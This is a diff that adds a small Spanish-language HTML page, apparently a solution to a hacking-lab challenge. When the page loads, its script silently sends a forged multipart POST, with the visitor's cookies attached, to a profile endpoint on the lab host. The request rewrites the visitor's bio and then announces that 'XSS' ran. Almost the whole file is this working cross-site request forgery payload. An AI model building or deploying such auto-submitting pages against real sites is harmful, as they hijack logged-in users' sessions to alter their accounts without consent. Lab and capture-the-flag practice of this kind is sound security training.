@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Página de prueba</h1>
+    <p>El script se ejecutará automáticamente al cargar la página...</p>
+
+    <script>
+        window.addEventListener('load', function() {
+            // Crear el boundary (puede ser cualquier string único)
+            const boundary = '---------------------------' + Date.now() + Math.random().toString(36).substring(2);
+            
+            // Construir el cuerpo multipart/form-data
+            const bodyParts = [
+                `--${boundary}`,
+                'Content-Disposition: form-data; name="bio"',
+                '',
+                'XSS funciono el xss',
+                `--${boundary}`,
+                'Content-Disposition: form-data; name="profile_pic"; filename=""',
+                'Content-Type: application/octet-stream',
+                '',
+                '',
+                `--${boundary}--`,
+                ''
+            ];
+
+            const body = bodyParts.join('\r\n');
+
+            // Hacer la petición POST con headers mínimos
+            fetch('https://chl-60c90126-7eb6-4091-9a75-f3f19ec79c09-blog-hacklab-v2.softwareseguro.com.ar/profile', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': `multipart/form-data; boundary=${boundary}`
+                },
+                credentials: 'include',
+                body: body
+            })
+            .then(response => {
+                console.log('✅ Petición POST enviada. Status:', response.status);
+                if (response.redirected) {
+                    window.location.href = response.url;
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log('📝 Respuesta recibida del servidor');
+                alert('XSS ejecutado correctamente');
+            })
+            .catch(error => {
+                console.log('❌ Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
